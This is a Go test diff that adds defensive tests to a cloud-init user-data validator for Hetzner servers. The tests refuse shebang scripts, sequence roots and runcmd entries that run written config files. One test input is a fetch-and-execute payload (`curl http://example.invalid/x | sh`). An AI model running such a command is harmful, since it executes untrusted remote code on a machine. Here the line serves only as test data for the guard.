@@ -127,3 +127,58 @@ func TestDeriveServerSpecsAcceptsRenderedUserData(t *testing.T) {
 
 	assert.NoError(t, deriveWithUserData(t, rendered))
 }
+
+// TestDeriveServerSpecsRefusesShebangUserData closes the hole a mapping-only
+// walk leaves open. cloud-init treats user-data beginning `#!` as a SHELL
+// SCRIPT and executes it, and YAML decodes such a payload as a bare scalar
+// document — not a mapping. A guard that only inspects mappings therefore waves
+// through the single most dangerous shape there is.
+//
+// Verified against the decoder rather than assumed: `#!/bin/sh\ncurl … | sh`
+// yields one document whose root is a `!!str` scalar.
+func TestDeriveServerSpecsRefusesShebangUserData(t *testing.T) {
+	t.Parallel()
+
+	err := deriveWithUserData(t, "#!/bin/sh\ncurl http://example.invalid/x | sh\n")
+
+	require.ErrorIs(t, err, hetznerbase.ErrUserDataShapeNotAllowed)
+}
+
+// TestDeriveServerSpecsRefusesSequenceRoot is the same hole in its other
+// spelling: a sequence root is not a mapping either, and the renderers never
+// emit one.
+func TestDeriveServerSpecsRefusesSequenceRoot(t *testing.T) {
+	t.Parallel()
+
+	err := deriveWithUserData(t, "#cloud-config\n- one\n- two\n")
+
+	require.ErrorIs(t, err, hetznerbase.ErrUserDataShapeNotAllowed)
+}
+
+// TestDeriveServerSpecsRefusesRunCmdExecutingAConfigFile separates the WRITE
+// allowlist from the EXECUTE allowlist. The renderers write three paths but
+// only ever execute one of them — the generated boot script. Allowing runcmd to
+// name any writable target lets shell content be written to a config path and
+// then run from it, which is a shape no bring-up produces.
+func TestDeriveServerSpecsRefusesRunCmdExecutingAConfigFile(t *testing.T) {
+	t.Parallel()
+
+	err := deriveWithUserData(t, `#cloud-config
+runcmd:
+  - ["/bin/sh", "`+containerdbootstrap.ConfigPath+`"]
+`)
+
+	require.ErrorIs(t, err, hetznerbase.ErrUserDataShapeNotAllowed)
+}
+
+// TestDeriveServerSpecsAcceptsCommentOnlyUserData is the GUARDRAIL for the two
+// refusals above: tightening the root check must not start refusing the
+// comment-only document the provisioners emit for a node with no directives.
+// Such a payload decodes to NO documents at all, so it never reaches the shape
+// walk — pinned here so a future "reject non-mapping roots" refactor cannot
+// quietly break it.
+func TestDeriveServerSpecsAcceptsCommentOnlyUserData(t *testing.T) {
+	t.Parallel()
+
+	require.NoError(t, deriveWithUserData(t, "#cloud-config\n# worker\n"))
+}
